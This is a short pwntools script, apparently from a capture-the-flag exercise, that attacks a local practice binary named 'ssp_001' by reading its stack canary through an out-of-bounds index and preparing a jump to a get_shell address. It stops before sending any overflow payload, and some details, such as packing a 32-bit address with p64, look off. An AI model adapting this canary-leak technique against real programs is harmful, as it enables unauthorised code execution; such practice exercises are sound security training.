from pwn import *

p = process('ssp_001')

get_shell = p64(0x80486b9)
print(get_shell)

size = 0x40 + 0x40 + 2 + 1 + 1

# first input
def get_number(index):
    p.recvuntil(b'> ')
    p.sendline(b'P')
    p.recvuntil(b'Element index : ')
    p.sendline(str(size + index))
    p.recvuntil('is : ')
    num = int(p.recvline().split()[0], 16).to_bytes()
    return num

# Get canary
canary = b''
for index in range(0, 12):
    canary += get_number(index)

print(canary)

p.interactive()
